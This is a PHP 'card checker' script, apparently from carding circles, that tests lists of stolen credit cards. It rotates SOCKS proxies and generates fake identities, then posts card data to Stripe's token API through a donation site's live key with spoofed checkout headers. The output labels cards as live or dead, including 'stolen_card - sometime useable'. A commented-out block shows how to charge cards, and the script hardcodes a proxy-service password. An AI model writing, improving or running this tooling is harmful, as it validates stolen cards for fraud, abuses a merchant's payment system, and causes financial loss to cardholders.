<?php

////////////////////////////===[ Khudka api banalo bc]///

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function monarchproxys()
{
  $poxySocks = file("Socks5.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = monarchproxys();
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]
$username = 'auto';
$password = 'vDtA7foguwxENqZz2BbeFij4Y';
$port = 8000;
$session = mt_rand();
$super_proxy = 'proxy.apify.com';

//=========================================================[Authorizing Cards]

$ch = curl_init();
//============================[Proxy_Apify]


//curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:vDtA7foguwxENqZz2BbeFij4Y");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ab6a92a1-f91b-1639-6d68-957940307538',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'
));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fdonate&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=13411&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=ccc513c7-0a1e-44ff-809b-380cc4d4efd3&sid=0119c1a8-0b67-4f13-96b5-66a02b2134d3&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');

echo $result = curl_exec($ch);
////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

/*//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, 'https://www.futureme.org/payments/stripe.json');
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.futureme.org',
'accept: text/plain, *//*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.futureme.org',
'referer: https://www.futureme.org/donate',
'Sec-Fetch-Mode: cors'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'stripeToken=tok_Gtuws5vWQ3pzym&stripeEmail=jordanti02%40gmail.com&recurring=false&donationAmount=500&path=%2Fdonate');

echo $result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
$token = trim(strip_tags(getStr($result,'"id": "','"')));
//////////////////////===[Card Response] */

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CV MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Your card's security code is invalid." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}

curl_close($ch);
ob_flush();

//////=========Comment Echo $result If U Want To Hide Site Side Response 

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\
